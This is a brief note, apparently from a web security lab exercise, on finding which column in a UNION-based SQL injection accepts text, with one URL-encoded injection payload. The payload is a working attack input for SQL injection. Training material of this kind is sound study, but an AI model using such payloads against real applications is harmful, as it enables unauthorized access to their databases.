# UNION attack, finding a column containing text

The column that is a string will accept the constant value specified in the lab, the others will accept NULL

```
'+UNION+SELECT+'abcdef',NULL,NULL—
```
